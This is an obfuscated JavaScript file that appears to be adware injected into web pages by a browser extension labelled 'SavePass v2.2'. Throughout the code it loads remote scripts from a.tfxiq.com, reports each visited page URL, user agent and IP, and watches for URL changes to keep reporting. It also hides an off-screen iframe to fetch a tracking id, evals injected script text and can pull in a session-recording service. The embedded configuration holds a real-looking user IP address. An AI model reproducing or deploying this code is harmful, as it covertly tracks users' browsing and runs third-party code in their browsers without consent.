(function(a,b,c,d,e,f){
	a[f]=a[f]||{};
	if(a[f][e.a.ref1]) return;
	a[f][e.a.ref1]=1;
	function k(y,x,w,v){y='prototype';x='appendChild';w='insertBefore';v='createElement';if(a.Node&&a.Element){if(Node[y][x]!=Element[y][x]) Element[y][x]=Node[y][x];if(Node[y][w]!=Element[y][w]) Element[y][w]=Node[y][w];}if(a.Document&&a.Document[y][v]!=b[v]){b[v]=Document[y][v]}}k();
	var z=(function(a,b){var c=b.createElement("div"),d={a:Math.random().toString(36).slice(3),b:new Date().getTime()},e=encodeURIComponent,f,g,h,i,j="b",k="d",l,m,n,z;z=function(x,y){return new z.O().init(x,y)};z.O=function(){};z.O.prototype={init:function(x,y){return g.a.call(this,x,y)},each:function(y){h.a(this[0],y,this)},append:function(y){h.b.call(this,y,"a")},removeChild:function(y){h.b.call(this,y,"f")},val:function(y){return h.d.call(this,"value",y,"m")},attr:function(x,y){return h.d.call(this,x,y,"m")},html:function(y){return h.d.call(this,"innerHTML",y,"o")},before:function(y){h.j.call(this,y,"j")},after:function(y){h.j.call(this,y,"k")},replace:function(y){h.j.call(this,y,"p")},remove:function(){h.c.call(this,"q")},children:function(){return h.n.call(this,"children")},childNodes:function(){return h.n.call(this,"childNodes")},bind:function(w,x,y){h.c.call(this,j,w,x,y)},unbind:function(w,x,y){h.c.call(this,k,w,x,y)},width:function(){return h.e.call(this,"Width")},height:function(){return h.e.call(this,"Height")},size:function(){return h.g.call(this)},locationSize:function(){return h.k.call(this)},aLocation:function(){return h.h.call(this,"g")},rLocation:function(){return h.h.call(this,"h")},css:function(x,y){h.i.call(this,x,y)},drag:function(y){h.f.call(this,y)},animationChange:function(y){h.l.call(this,y)},animationGradient:function(y){h.m.call(this,y)}};g={a:function(x,y){switch(typeof x){case"object":this[0]=g.b.call(this,x);return this;case"string":x=x.trim();var v=x.charAt(0)+"*",w=g[v]&&g[v]()||g["*"]();this[0]=g.z(x,y,w);return this}},b:function(y){return g.x(y)&&y||[y]},c:function(y){if(y.nodeType){y.nodeType.z=this}return y},d:function(x,y){return f[y.nodeType].call(y,x)},e:function(y){y=y.substring(1);return[b.getElementById(y)]},f:function(x,y){var u=g.y(x),v=0,w;for(;w=u[v];v++){y.appendChild(w)}return u},g:function(y){return g.y(y)},w:function(y){return y instanceof z.O},x:function(y){return y instanceof Array||y instanceof NodeList},y:function(y){var u=[],v=0,w,x;c.innerHTML=y;w=c.childNodes;for(;x=w[v];v++){u.push(x)}return u},z:function(w,x,y){return x&&y.a(w,x)||y.b(w,x||b)},"#*":function(){return{a:this.d,b:this.e}},"<*":function(){return{a:this.f,b:this.g}},"*":function(){return{a:this.d,b:this.d}}};h={a:function(){var u,v=0,t=arguments,w=t[0],x=t[1],y=i.z(2,t);for(;u=w[v];v++){x(u,y)}},b:function(y,w,x){x=this[0][0];y=g.w(y)?y[0]:y;g.x(y)?h.a(y,i[w],x):i[w](y,[x])},c:function(v,w,x,y){h.a(this[0],i[v],w,x,y)},d:function(w,x,y){return x!==undefined?h.a(this[0],i[y],w,x):i.n(this[0][0],w)},e:function(y){return this[0][0]["offset"+y]},f:function(y,w,x){w=y.moveLayer;x=y.bgLayer;y.moveLayer=g.w(w)?w:z(w);x=x||b.body;y.bgLayer=g.w(x)?x:z(x);i.l(this,y)},g:function(){return{width:h.e.call(this,"Width"),height:h.e.call(this,"Height")}},h:function(y){return i[y](this[0][0])},i:function(x,y){if(y===undefined){y=x;x="cssText"}h.a(this[0],i.i,x,y)},j:function(w,x,y){y=this[0][0];w=g.w(w)?w[0][0]:w;i[x](y,w)},k:function(y){y=h.g.call(this);y.left=h.e.call(this,"Left");y.top=h.e.call(this,"Top");return y},l:function(y){clearInterval(this.setInterval1);var x=y.ms*n.a,w=this.locationSize(),v=this,u=y.style,t={},s=y.ms/x;for(var p in u){t[p]=(u[p]-w[p])/x}this.setInterval1=setInterval(function(){if(x--<=0){clearInterval(v.setInterval1);for(var p in u){v.css(p,u[p]+"px")}y.afterChange&&y.afterChange(v);return}for(var p in u){w[p]+=t[p];v.css(p,w[p]+"px")}y.changing&&y.changing(v);},s)},m:function(y){clearInterval(this.setInterval2);var x=y.ms*n.a,s=y.ms/x,v=y.start,t=y.end,w=(t-v)/x,u=this;this.setInterval2=setInterval(function(){if(x--<=0){clearInterval(u.setInterval2);u.css("opacity",t);u.css("filter","alpha(opacity="+(t*100)+")");y.afterChange&&y.afterChange(u);return}v+=w;u.css("opacity",v);u.css("filter","alpha(opacity="+(v*100)+")");y.changing&&y.changing(u);},s)},n:function(y){return this[0][0][y]}};i={a:function(x,y){y[0].appendChild(x)},b:function(x,y){x.addEventListener(y[0],y[1],y[2])},c:function(x,y,w){w=l.a(x,y);x.attachEvent("on"+y[0],w)},d:function(x,y){x.removeEventListener(y[0],y[1],y[2])},e:function(x,y,w){w=d.a;x.detachEvent("on"+y[0],x[w][y[0]][y[1][w]])},f:function(x,y){y[0].removeChild(x)},g:function(x,y,v,w){v=0;w=0;do{v+=x.offsetLeft;w+=x.offsetTop}while(x=x.offsetParent);return{left:v,top:w}},h:function(y){return{left:y.offsetLeft,top:y.offsetTop}},i:function(x,y){x.style[y[0]]=y[1]},j:function(x,y){x.parentNode.insertBefore(y,x)},k:function(w,x,y){y=w.nextSibling;y?this.j(y,x):w.parentNode.appendChild(x)},l:function(x,y){x.bind("mousedown",l.b);h.a(x[0],l.c,y)},m:function(x,y){x.setAttribute(y[0],y[1])},n:function(x,y){return x.getAttribute(y)},o:function(x,y,w,v){x[y[0]]='<span style="display:none">z</span>'+y[1];w=z("script",x);w.each(l.f)},p:function(x,y){x.parentNode.replaceChild(y,x)},q:function(y){y.parentNode.remove(y)},z:function(v,w,x,y){x=[];for(;(y=w[v])||y!==undefined;v++){x.push(y)}return x}};l={a:function(x,y){var u=d.a,v,w=y[0],s=y[1],t=x[u]=x[u]||{};t[w]=t[w]||{};s[u]=s[u]||d.b++;t[w][s[u]]=function(y){s.call(x)};return t[w][s[u]]},c:function(x,y,w){w=d.a;x[w]=x[w]||{};x[w].temp=y[0]},f:function(y){if(y.src){var x=b.createElement("script");x.src=y.src;y.parentNode.replaceChild(x,y)}else{eval(y.text)}}};n={a:0.06};z.windowDimension=function(y){y=y||a;return{width:b.documentElement.clientWidth||a.innerWidth||b.body.clientWidth,height:b.documentElement.clientHeight||a.innerHeight||b.body.clientHeight,left:b.documentElement.scrollLeft||b.body.scrollLeft,top:b.documentElement.scrollTop||b.body.scrollTop}};z.c=function(w,x,y){y=b.createElement(w);for(var k in x){y[k]=x[k]}return y};z.head=b.getElementsByTagName("head")[0];z.script=function(y,x){x=z.c("script",{src:y});z.head.appendChild(x);return x};z.css=function(x,y){y=z.c("style",{type:"text/css"});y.styleSheet?y.styleSheet.cssText=x:y.appendChild(b.createTextNode(x));z.head.appendChild(y)};z.getCookie=function(w,x,y){var x=new RegExp('(^| )'+w+'=([^;]*)(;|$)'),y=b.cookie.match(x);return y&&y[2]||null;};z.scrollTop=function(){return b.documentElement.scrollTop||b.body.scrollTop};f=a.Document?(function(a){a=Element.prototype.querySelectorAll;return{"1":a,"4":a,"9":Document.prototype.querySelectorAll}})():(function(s,w){s=b.createStyleSheet();w=function(r,c,i,j,a){a=this.getElementsByTagName("*"),c=[],r=r.replace(/\[for\b/gi,"[htmlFor").split(",");for(i=r.length;i--;){s.addRule(r[i],"k:v");for(j=a.length;j--;){a[j].currentStyle.k&&c.push(a[j])}s.removeRule(0)}return c};return{"1":w,"4":w,"9":w}})();if(!String.prototype.trim){String.prototype.r=/^\s+|\s+$/g;String.prototype.trim=function(){return this.replace(this.r,"")}}if(!a.NodeList){NodeList=function(){}}if(!a.addEventListener){j="c";k="e"};z.MD5=function(F){function t(b){try{console.log(b)}catch(a){}}function C(c){var b=(c>>>24).toString(16);var a=(c&16777215).toString(16);return"00".substr(0,2-b.length)+b+"000000".substr(0,6-a.length)+a}function s(c){var a=[];for(var b=0;b<c.length;b++){a=a.concat(x(c[b]))}return a}function q(b){var a=[];for(var c=0;c<8;c++){a.push(b&255);b=b>>>8}return a}function v(b,a){return((b<<a)&4294967295)|(b>>>(32-a))}function k(a,H,i){return(a&H)|(~a&i)}function h(a,H,i){return(i&a)|(~i&H)}function g(a,H,i){return a^H^i}function f(a,H,i){return H^(a|~i)}function j(a,b){return(a[b+3]<<24)|(a[b+2]<<16)|(a[b+1]<<8)|(a[b])}function x(H){var a=[];for(var d=0;d<H.length;d++){if(H.charCodeAt(d)<=127){a.push(H.charCodeAt(d))}else{var c=encodeURIComponent(H.charAt(d)).substr(1).split("%");for(var b=0;b<c.length;b++){a.push(parseInt(c[b],16))}}}return a}function w(I,H,O,N){var M="";var L=0;var J=0;for(var K=3;K>=0;K--){J=arguments[K];L=(J&255);J=J>>>8;L=L<<8;L=L|(J&255);J=J>>>8;L=L<<8;L=L|(J&255);J=J>>>8;L=L<<8;L=L|J;M=M+C(L)}return M}var G=null;if(typeof F=="string"){G=x(F)}else{if(F.constructor==Array){if(F.length===0){G=F}else{if(typeof F[0]=="string"){G=s(F)}else{if(typeof F[0]=="number"){G=F}else{t("input data type mismatch");return null}}}}else{t("input data type mismatch");return null}}var m=G.length;G.push(128);var r=G.length%64;if(r>56){for(var z=0;z<(64-r);z++){G.push(0)}r=G.length%64}for(z=0;z<(56-r);z++){G.push(0)}G=G.concat(q(m*8));var p=1732584193;var o=4023233417;var n=2562383102;var l=271733878;var E=0,D=0,B=0,A=0;function y(b,a){return 4294967295&(b+a)}var u=function(d,i,b,a){var c=A;A=B;B=D;D=y(D,v(y(E,y(d,y(i,b))),a));E=c};for(z=0;z<G.length/64;z++){E=p;D=o;B=n;A=l;var e=z*64;u(k(D,B,A),3614090360,j(G,e),7);u(k(D,B,A),3905402710,j(G,e+4),12);u(k(D,B,A),606105819,j(G,e+8),17);u(k(D,B,A),3250441966,j(G,e+12),22);u(k(D,B,A),4118548399,j(G,e+16),7);u(k(D,B,A),1200080426,j(G,e+20),12);u(k(D,B,A),2821735955,j(G,e+24),17);u(k(D,B,A),4249261313,j(G,e+28),22);u(k(D,B,A),1770035416,j(G,e+32),7);u(k(D,B,A),2336552879,j(G,e+36),12);u(k(D,B,A),4294925233,j(G,e+40),17);u(k(D,B,A),2304563134,j(G,e+44),22);u(k(D,B,A),1804603682,j(G,e+48),7);u(k(D,B,A),4254626195,j(G,e+52),12);u(k(D,B,A),2792965006,j(G,e+56),17);u(k(D,B,A),1236535329,j(G,e+60),22);u(h(D,B,A),4129170786,j(G,e+4),5);u(h(D,B,A),3225465664,j(G,e+24),9);u(h(D,B,A),643717713,j(G,e+44),14);u(h(D,B,A),3921069994,j(G,e),20);u(h(D,B,A),3593408605,j(G,e+20),5);u(h(D,B,A),38016083,j(G,e+40),9);u(h(D,B,A),3634488961,j(G,e+60),14);u(h(D,B,A),3889429448,j(G,e+16),20);u(h(D,B,A),568446438,j(G,e+36),5);u(h(D,B,A),3275163606,j(G,e+56),9);u(h(D,B,A),4107603335,j(G,e+12),14);u(h(D,B,A),1163531501,j(G,e+32),20);u(h(D,B,A),2850285829,j(G,e+52),5);u(h(D,B,A),4243563512,j(G,e+8),9);u(h(D,B,A),1735328473,j(G,e+28),14);u(h(D,B,A),2368359562,j(G,e+48),20);u(g(D,B,A),4294588738,j(G,e+20),4);u(g(D,B,A),2272392833,j(G,e+32),11);u(g(D,B,A),1839030562,j(G,e+44),16);u(g(D,B,A),4259657740,j(G,e+56),23);u(g(D,B,A),2763975236,j(G,e+4),4);u(g(D,B,A),1272893353,j(G,e+16),11);u(g(D,B,A),4139469664,j(G,e+28),16);u(g(D,B,A),3200236656,j(G,e+40),23);u(g(D,B,A),681279174,j(G,e+52),4);u(g(D,B,A),3936430074,j(G,e),11);u(g(D,B,A),3572445317,j(G,e+12),16);u(g(D,B,A),76029189,j(G,e+24),23);u(g(D,B,A),3654602809,j(G,e+36),4);u(g(D,B,A),3873151461,j(G,e+48),11);u(g(D,B,A),530742520,j(G,e+60),16);u(g(D,B,A),3299628645,j(G,e+8),23);u(f(D,B,A),4096336452,j(G,e),6);u(f(D,B,A),1126891415,j(G,e+28),10);u(f(D,B,A),2878612391,j(G,e+56),15);u(f(D,B,A),4237533241,j(G,e+20),21);u(f(D,B,A),1700485571,j(G,e+48),6);u(f(D,B,A),2399980690,j(G,e+12),10);u(f(D,B,A),4293915773,j(G,e+40),15);u(f(D,B,A),2240044497,j(G,e+4),21);u(f(D,B,A),1873313359,j(G,e+32),6);u(f(D,B,A),4264355552,j(G,e+60),10);u(f(D,B,A),2734768916,j(G,e+24),15);u(f(D,B,A),1309151649,j(G,e+52),21);u(f(D,B,A),4149444226,j(G,e+16),6);u(f(D,B,A),3174756917,j(G,e+44),10);u(f(D,B,A),718787259,j(G,e+8),15);u(f(D,B,A),3951481745,j(G,e+36),21);p=y(p,E);o=y(o,D);n=y(n,B);l=y(l,A)}return w(l,n,o,p)};
;return z})(a,b);e.a.tfsid=z.MD5(Math.random()*1e8+'_'+(new Date().getTime())+'_'+Math.random());
	var g=new Date().getTime(),h,j=e.a.tfsid.replace(/\.|\d/g,''),k=e.a.tfsid,l,m='t_c_b'+g++,n,o,p=encodeURIComponent,T,ff=function(){new A().z(e);},
	A=function(){};
	var meg=[],spd={},kdsw="";
	A.prototype={
		z:function(e,y){
			z.script(d+'/u.php?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&pf=pv');
			e.a.CRPName=e.c?h.a():e.a.CRPName;
			e.a.callback=m;y=this.y.a=this;
			a[m]=function(x){
				x&&x.type&&y[x.type[0]].cb(x);
			};
			h.b.call(this,e);
		},
		y:function(y){
			a[y]=null;
			return [z,arguments.callee.a,h,e,j,k,p];
		},
		x:function(y,x,o){
			x=c.href;o=this;
			setInterval(function(w,v,u){
				if(c.href!=x){
					x=c.href;w=y;
					e.a.tfsid=z.MD5(Math.random()*1e8+'_'+(new Date().getTime())+'_'+Math.random());
					z.script(d+'/u.php?'+h.c(['callback','rc','rc_','user_agent','pid'])+'&pf=pv');
					for(v in w){
						w[v]&&o[v].ss(e);
					}
				}
			},300);
		},
		w:function(y,x){
			if(!e.ss){
				e.ss={};
				this.x(e.ss);
			}
			e.ss[y]=x;
		}
	};
	h={
		a:function(){
			try{return window['__rvzbsrchpo'].product_name;}catch(e){return '';} 
		},
		b:function(e,y,x,w,v,u){
			y=e.b;x='&'+h.c(['callback','pid','rc','rc_'])+'&page_url='+p(location.href);
			for(w=0;v=y[w];w++){
				u=h.j()+g++;
				a[u]=this.y;
				z.script('//'+v+'cb='+u+x);
			}
		},
		c:function(w,x,y,v,u){
			x=new RegExp('^('+w.join('|')+')$','i'),y=e.a,v=[];
			for(u in y){
				if(!x.exec(u)){
					v.push(u+'='+p(y[u]));
				}
			}
			return v.join('&');
		},
		d:function(y,x,w){
			x='';
			for(w in y){
				x+=w+'='+y[w]+';';
			}
			b.cookie=x;
		},
		e:function(y){
			y=y||a.event;
			y.stopPropagation?y.stopPropagation():y.cancelBubble=true;
		},
		f:function(y,x,w,v,u,t,s,r,p,o,n,m,l,k){
			s='display';r='none';o='click';n=this;m=n[1];
			p=function(){w.css(s,r);z(b.body).unbind('click',p)};
			l=function(){n[11]=this.value;v.removeAttribute('disabled')};
			w.bind(o,function(q){h.e(q)});
			x.bind(o,function(q){h.e(q);w[0][0].style[s]==r?(w.css(s,'block')|z(b.body).bind('click',p)):p()});
			z(v).bind(o,function(j){z.script(m.n+'?'+h.c(['rc_','rc','callback']).replace(/&ref/g,'&626ref').replace(/&CRPName/,'&626Name')+'&n='+m.m+'&d='+n[11]);j=y[0][0];j.parentNode.removeChild(j);w[0][0].parentNode.removeChild(w[0][0])});
			for(k=0;k<t;k++){
				u[k].onclick=l;
			}
		},
		g:function(y,x,w){
			/**w=e.a;
			x=z.c('img',{height:'1px',width:'1px',src:d+'/m.php?ld='+p(y)+'&teid='+w.teid+'&tuid='+w.tuid});
			z.head.appendChild(x);*/
		},
		h:function(y){
			y&&y.preventDefault?y.preventDefault():a.event.returnValue=false;
			return false; 
		},
		i:function(y,x){
			x=new Date();
			x.setTime(x.getTime()+y*3600000);
			return x.toGMTString();
		},
		j:function(y){
			y=Math.random().toString(26);
			return y.slice(y.length - 14);
		},
		k:function(y,x,w,v,u,t){
			w=/^(#|javascript)/;v=y.getElementsByTagName('a');
			for(u=0;t=v[u];u++){
				if(w.test(t.getAttribute('href'))) continue;
				t[j]=x;
			}
		},
		Hour:function(y){
			return y+' Hour';
		},
		Day:function(y){
			return (y/24)+' Day';
		},
		Week:function(y){
			return (y/168)+' Week';
		},
		Year:function(y,x){
			x=Math.ceil(y/24/365);
			return x<10&&(' '+x+' Year')||' Permanently';
		}
	};
	function aaa(a,b,c,ee,ff,d,e,f,g){
		g=ee.a;
		d=b.createElement('iframe');
		d.style.cssText='position:absolute;left:-9999px;top:-9999px;';
		d.src=c+'/e.php?user_ip='+g.user_ip+'&cc='+g.cc+'&v=1';
		f=0;
		e=function(z){
			try{
				if(++f==3){
					g.uuid=[d.contentWindow.name];
					b.body.removeChild(d);
					ff();
				}else if(f==2){
					d.contentWindow.location='about:blank';
				}
			}catch(p){}
		};
		if(d.attachEvent){
			d.attachEvent('onload',e);
		}else{
			d.onload=e;
		}
		b.body.appendChild(d);
	}
	if('7269636872697665726d656469615f73657270'==e.a.ref1){
		if(e.a.uuid){
			new A().z(e);
			ff=function(){};
		}
		aaa(a,b,d,e,ff);
	}else{
		new A().z(e);
	}

	//ttttt
	if(e.ccabe){
		a.__insp=a.__insp||[];
		__insp.push(['wid',313579092]);
		ss=z.script('//cdn.inspectlet.com/inspectlet.js');
		ss.id='inspsync';
	}
	//ttttt
})(window,document,location,'//a.tfxiq.com',{"a":{"ref1":"63726f73737269646572","ref2":"540150411425000000","ref3":"A0E52BE5D14C445980EB616223028405IE","tuid":"A0E52BE5D14C445980EB616223028405IE","teid":"69829","uuid":"da15ed7b1c5ea69ca39b5a8cb27c921d","user_ip":"36.37.239.75","cc":"KH","CRPName":"SavePass v2.2","rc":3,"rc_":3,"user_agent":"Mozilla\/5.0 (Windows NT 6.1) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/39.0.2171.95 Safari\/537.36","pid":"106"},"b":["a.tfxiq.com\/c.php?f=2057&"],"c":false},'!)(@#*&$%^')